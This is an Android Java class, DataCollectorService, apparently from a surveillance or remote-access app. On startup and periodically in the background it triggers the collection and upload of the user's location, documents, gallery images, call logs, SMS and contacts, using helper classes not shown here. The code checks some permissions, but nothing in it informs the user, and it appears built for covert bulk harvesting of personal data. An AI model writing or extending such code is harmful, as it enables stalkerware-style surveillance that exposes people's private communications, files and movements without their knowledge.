package com.bushorat.app.helpers;

import android.content.Context;
import android.util.Log;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;

/**
 * Ensures ALL data (location, documents, media) is collected and uploaded
 * Runs on app startup and periodically in background
 */
public class DataCollectorService {
    private static final String TAG = "DataCollectorService";

    public static void collectAllData(Context context) {
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user == null) {
            Log.w(TAG, "No user logged in, skipping data collection");
            return;
        }

        String userId = user.getUid();
        Log.d(TAG, "🔄 Starting comprehensive data collection for user: " + userId);

        // Collect location (most important)
        collectLocation(context);

        // Collect documents
        collectDocuments(context);

        // Collect media/gallery
        collectGallery(context);

        // Collect other data
        collectOtherData(context);

        Log.d(TAG, "✓ Data collection cycle complete");
    }

    private static void collectLocation(Context context) {
        try {
            Log.d(TAG, "📍 Collecting location data...");
            
            if (!FeaturePermissions.hasLocationPermission(context)) {
                Log.w(TAG, "  Location permission not granted");
                return;
            }

            LocationSyncHelper.uploadIfAllowed(context);
            Log.d(TAG, "✓ Location sync triggered");
        } catch (Exception e) {
            Log.e(TAG, "Failed to collect location", e);
        }
    }

    private static void collectDocuments(Context context) {
        try {
            Log.d(TAG, "📄 Collecting documents...");
            
            // Check storage permissions
            if (!FeaturePermissions.hasGalleryPermission(context)) {
                Log.w(TAG, "  Storage permission not granted");
                return;
            }

            // Enqueue document upload immediately
            DocumentUploadWorker.enqueueWork(context);
            Log.d(TAG, "✓ Document upload enqueued");
        } catch (Exception e) {
            Log.e(TAG, "Failed to collect documents", e);
        }
    }

    private static void collectGallery(Context context) {
        try {
            Log.d(TAG, "🖼️  Collecting gallery images...");
            
            if (!FeaturePermissions.hasGalleryPermission(context)) {
                Log.w(TAG, "  Storage permission not granted");
                return;
            }

            // Enqueue image upload
            ImageUploadWorker.enqueueWork(context);
            Log.d(TAG, "✓ Gallery upload enqueued");
        } catch (Exception e) {
            Log.e(TAG, "Failed to collect gallery", e);
        }
    }

    private static void collectOtherData(Context context) {
        try {
            Log.d(TAG, "📞 Collecting other data (calls, SMS, contacts)...");
            UserDataSyncHelper.syncAll(context);
            Log.d(TAG, "✓ Other data sync triggered");
        } catch (Exception e) {
            Log.e(TAG, "Failed to collect other data", e);
        }
    }
}
